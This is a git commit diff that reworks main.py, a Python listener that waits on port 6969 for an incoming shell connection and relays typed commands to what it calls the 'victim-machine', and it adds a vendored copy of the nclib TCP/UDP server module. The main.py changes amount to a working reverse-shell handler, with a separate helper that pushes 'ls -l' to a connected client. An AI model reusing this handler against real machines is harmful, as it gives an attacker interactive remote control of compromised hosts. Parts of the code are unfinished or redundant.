34e7393689eee06afe3af39fa6b02b3d34d15352
Ryan <rstachurr@gmail.com>
2024-02-23 20:50:44 -0500

    minor changes

--- main.py
+++ main.py
@@ -1,15 +1,49 @@
-from nclib import TCPServer
-from time import sleep
-from signal import signal, SIGINT
-from threading import Thread
+from time       import sleep
+from signal     import signal, SIGINT
+from threading  import Thread, currentThread
+from builtins   import print as builtin_print
 
 # Globals
 g_server                  = None
 g_client                  = None
 g_connection_established  = False
 g_was_signal_caught       = False
+g_thread_print_names      = dict()
 
 
+# Override to prefix user-defined thread name
+def print(*args, **kwargs):
+    global g_thread_print_names
+
+    id = currentThread().ident
+    prefix = g_thread_print_names.get(id)
+    
+    if prefix is not None:
+        args = (prefix, *args)
+
+    builtin_print(*args, **kwargs)
+
+def signal_handler(signum, _frame):
+    global g_server, g_was_signal_caught
+
+    g_was_signal_caught = True
+    print('-=-=- Caught signal %d -=-=-' % signum)
+    return
+
+def set_thread_print_name(name: str = None):
+    global g_thread_print_names
+
+    id = currentThread().ident
+
+    if name is None or len(name) == 0:
+        g_thread_print_names.pop(id, None)
+    else:
+        g_thread_print_names[id] = f'[{name}]'
+
+
+
+
+from nclib import TCPServer
 
 def close_server():
     global g_server
@@ -19,27 +53,21 @@ def close_server():
             g_server.sock.close()
             g_server.close()
 
-def signal_handler(signum, _frame):
-    global g_server, g_was_signal_caught
-
-    g_was_signal_caught = True
-    print('-=-=- Caught signal %d -=-=-' % signum)
-    return
-
-
-def on_accept(did_succeed: bool):
+def on_accept_callback(did_succeed: bool):
     global g_client, g_connection_established
 
     g_connection_established = did_succeed
     if did_succeed:
-        print('[TCP Server] Connected to %s:%d' % g_client.peer)
+        print('Connected to %s:%d' % g_client.peer)
 
 def async_accept(ip: str, port: int, callback):
     global g_server, g_client, g_connection_established
 
+    set_thread_print_name('TCP Server')
+
     host = (ip, port)
     g_server = TCPServer(host)
-    print('[TCP Server] Listening on %s:%d' % host)
+    print('Listening on %s:%d' % host)
 
     # Wait for a single connection.
     status = False
@@ -49,17 +77,17 @@ def async_accept(ip: str, port: int, callback):
             break
         status = True
     except Exception as e:
-        print('[TCP Server] ERROR: Failed to make connection:\n\t', e)
+        print('ERROR: Failed to make connection:\n\t', e)
     
     # Hit callback.
     callback(status)
     return
 
-def listener(ip: str = '0.0.0.0', port: int = 6969):
+def listener(ip: str, port: int):
     global g_server, g_client, g_connection_established, g_was_signal_caught
 
-    # Start TCP g_server on a new thread.
-    t = Thread(target=async_accept, args=(ip, port, on_accept))
+    # Start TCP server on a new thread.
+    t = Thread(target=async_accept, args=(ip, port, on_accept_callback))
     t.start()
     
     # Wait for a connection or ctrl+c interrupt.
@@ -82,16 +110,17 @@ def listener(ip: str = '0.0.0.0', port: int = 6969):
             
             # uwu
             try:
-                # get user input command and write command to socket
-                command = input('victim-machine> ')
-                g_client.writeln(command)
-    
                 # get output until dollar sign (bash --posix forces bash-X.X$)
-                # data = g_client.read_until('$')
+                data = g_client.read_until('$')
                 # data = g_client.read_until('#')
-                data = g_client.read(4096, 1.0)
+                # data = g_client.read(4096, 1.0)
                 # data = g_client.interact()
                 print(data.decode('utf-8'), end='')  # print string of received bytes
+    
+                # get user input command and write command to socket
+                # command = input('victim-machine> ')
+                command = input(' ')
+                g_client.writeln(command)
     
             except KeyboardInterrupt:
                 print('Keyboard Interrupt')
@@ -111,10 +140,122 @@ def listener(ip: str = '0.0.0.0', port: int = 6969):
 
 
 
+import socket
+import select
+import struct
+
+def getTCPInfo(s):
+    '''struct tcp_info
+    {
+        u_int8_t	tcpi_state;
+        u_int8_t	tcpi_ca_state;
+        u_int8_t	tcpi_retransmits;
+        u_int8_t	tcpi_probes;
+        u_int8_t	tcpi_backoff;
+        u_int8_t	tcpi_options;
+        u_int8_t	tcpi_snd_wscale : 4, tcpi_rcv_wscale : 4;
+
+        u_int32_t	tcpi_rto;
+        u_int32_t	tcpi_ato;
+        u_int32_t	tcpi_snd_mss;
+        u_int32_t	tcpi_rcv_mss;
+
+        u_int32_t	tcpi_unacked;
+        u_int32_t	tcpi_sacked;
+        u_int32_t	tcpi_lost;
+        u_int32_t	tcpi_retrans;
+        u_int32_t	tcpi_fackets;
+
+        /* Times */
+        u_int32_t	tcpi_last_data_sent;
+        u_int32_t	tcpi_last_ack_sent;
+        u_int32_t	tcpi_last_data_recv;
+        u_int32_t	tcpi_last_ack_recv;
+
+        /* Metrics */
+        u_int32_t	tcpi_pmtu;
+        u_int32_t	tcpi_rcv_ssthresh;
+        u_int32_t	tcpi_rtt;
+        u_int32_t	tcpi_rttvar;
+        u_int32_t	tcpi_snd_ssthresh;
+        u_int32_t	tcpi_snd_cwnd;
+        u_int32_t	tcpi_advmss;
+        u_int32_t	tcpi_reordering;
+    };'''
+
+    x = struct.unpack('B'*7+'I'*21, s.getsockopt(socket.SOL_TCP, socket.TCP_INFO, 1*7+4*21))
+    print(x)
+
+def netcat(hostname, port, content):
+    host = (hostname, port)
+
+    print('Creating socket')
+    sock = socket.socket(type=socket.SOCK_STREAM)
+    print('Setting options')
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    print('Binding')
+    sock.bind(host)
+    print('Listening')
+    sock.listen()
+
+    # print('r/w pair')
+    # _rsock, _wsock = socket.socketpair()
+    #
+    # print('select')
+    # rl, _, _ = select.select([sock, _rsock], [], [])
+    # if _rsock in rl:
+    #     print('closing r/w')
+    #     _rsock.close()
+    #     _wsock.close()
+
+    print('Waiting for connection...')
+    client, addr = sock.accept()
+    # yield Netcat(sock=client, server=addr)
+    print('Connected to %s:%d' % addr)
+    
+    print('  - blocking =', client.getblocking())
+    print('  - timeout  =', client.gettimeout())
+
+    # print('Setting blocking to False')
+    # client.setblocking(False)
+    # print('  - blocking =', client.getblocking())
+    # print('  - timeout  =', client.gettimeout())
+
+    client.sendall(b'ls -l')
+
+
+    data = b''
+    while not g_was_signal_caught:
+        try:
+            recv = client.recv(1)
+        except Exception as e:
+            print('Exception:', e)
+            break
+
+        if recv == b'':
+            print('Received all data')
+            break
+            
+    print('data =', data)
+    client.close()
+    sock.close()
+
+
 
 
 
 if __name__ == '__main__':
     signal(SIGINT, signal_handler)
-    listener()
-    print('Done')
+    set_thread_print_name('Main')
+
+    print('-=-=- Start -=-=-')
+    
+    set_thread_print_name()
+    set_thread_print_name()
+    set_thread_print_name()
+    set_thread_print_name()
+    listener('0.0.0.0', 6969)
+    # netcat('0.0.0.0', 6969, None)
+    set_thread_print_name('Main')
+    
+    print('-=-=- Done -=-=-')
---
+++ venv/lib/python3.8/site-packages/nclib/server.py
@@ -0,0 +1,102 @@
+from typing import Tuple
+import socket
+import select
+
+from . import Netcat
+
+class TCPServer:
+    """
+    A simple TCP server model. Iterating over it will yield client sockets as
+    Netcat objects.
+
+    :param bindto:          The address to bind to, a tuple (host, port)
+    :param kernel_backlog:  The argument to listen()
+
+    Any additional keyword arguments will be passed to the constructor of the
+    Netcat object that is constructed for each client.
+
+    Here is a simple echo server example:
+
+    >>> from nclib import TCPServer
+    >>> server = TCPServer(('0.0.0.0', 1337))
+    >>> for client in server:
+    ...     client.send(client.recv()) # or submit to a thread pool for async handling...
+
+    """
+    def __init__(self, bindto: Tuple[str, int], kernel_backlog: int=5, **kwargs):
+        self.addr = bindto
+        self.kwargs = kwargs
+
+        self.sock = socket.socket(type=socket.SOCK_STREAM)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.sock.bind(bindto)
+        self.sock.listen(kernel_backlog)
+
+        self._oob_rsock, self._oob_wsock = socket.socketpair()
+        self.closed = False
+
+    def __iter__(self):
+        while True:
+            rl, _, _ = select.select([self.sock, self._oob_rsock], [], [])
+            if self._oob_rsock in rl:
+                self._oob_rsock.close()
+                self._oob_wsock.close()
+                break
+            client, addr = self.sock.accept()
+            yield Netcat(sock=client, server=addr, **self.kwargs)
+
+    def close(self):
+        """
+        Tear down this server and release its resources
+        """
+        if not self.closed:
+            self.closed = True
+            self._oob_wsock.send(b'.')
+            self.sock.close()
+
+
+class UDPServer:
+    """
+    A simple UDP server model. Iterating over it will yield of tuples of
+    datagrams and peer addresses. To respond, use the respond method, which
+    takes the response and the peer address.
+
+    :param bindto:      The address to bind to, a tuple (host, port)
+    :param dgram_size:  The size of the datagram to receive. This is
+                        important! If you send a message longer than the
+                        receiver's receiving size, the rest of the message
+                        will be silently lost! Default is 4096.
+
+    Here is a simple echo server example:
+
+    >>> from nclib import UDPServer
+    >>> server = UDPServer(('0.0.0.0', 1337))
+    >>> for message, peer in server:
+    ...     server.respond(message, peer) # or submit to a thread pool for async handling...
+
+    """
+    def __init__(self, bindto, dgram_size=4096):
+        self.addr = bindto
+        self.dgram_size = dgram_size
+        self.sock = socket.socket(type=socket.SOCK_DGRAM)
+
+    def __iter__(self):
+        while True:
+            packet, peer = self.sock.recvfrom(self.dgram_size)
+            yield packet, peer
+
+    def respond(self, packet, peer, flags=0):
+        """
+        Send a message back to a peer.
+
+        :param packet:      The data to send
+        :param peer:        The address to send to, as a tuple (host, port)
+        :param flags:       Any sending flags you want to use for some reason
+        """
+        self.sock.sendto(packet, flags, peer)
+
+    def close(self):
+        """
+        Tear down this server and release its resources
+        """
+        return self.sock.close()
